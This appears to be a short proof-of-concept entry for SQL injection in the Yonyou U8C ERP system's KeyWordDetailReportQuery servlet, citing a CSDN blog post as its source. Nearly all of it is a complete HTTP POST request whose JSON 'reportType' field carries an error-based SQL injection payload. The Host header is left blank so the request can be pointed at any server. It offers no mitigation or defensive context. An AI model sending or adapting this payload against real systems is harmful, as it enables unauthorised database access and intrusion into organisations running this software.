# yonyou_u8c_KeyWordDetailReportQuery_sqli

from:https://blog.csdn.net/luochen2436/article/details/135268293
24/01/02 @2

```
POST /servlet/~iufo/nc.itf.iufo.mobilereport.data.KeyWordDetailReportQuery HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info
Content-Length: 207
Accept: */*
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
Accept-Language: zh-CN,zh;q=0.8
Cache-Control: max-age=0
Connection: keep-alive
Content-Type: application/json
Accept-Encoding: gzip
Connection: close
SL-CE-SUID: 29

{"reportType": "' AND 2780 IN (select sys.fn_sqlvarbasetostr(HashBytes('MD5','123456'))) AND 'njGF'='njGF", "usercode": "18701014496", "keyword": [{"keywordPk": "1", "keywordValue": "1", "keywordIndex": 1}]}

```
